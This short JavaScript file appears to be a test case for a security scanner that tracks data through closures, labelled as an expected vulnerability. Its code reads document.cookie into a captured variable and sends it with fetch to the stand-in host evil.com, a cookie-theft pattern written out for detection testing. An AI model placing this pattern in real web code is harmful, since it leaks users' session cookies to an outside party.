/**
 * Test: Closure variable modification
 * Expected: VULNERABILITY - modified closure variable to fetch
 */

function test() {
  var data = "safe";
  
  function capture() {
    data = document.cookie;
  }
  
  function leak() {
    fetch('https://evil.com?data=' + data);
  }
  
  capture();
  leak();
}

test();
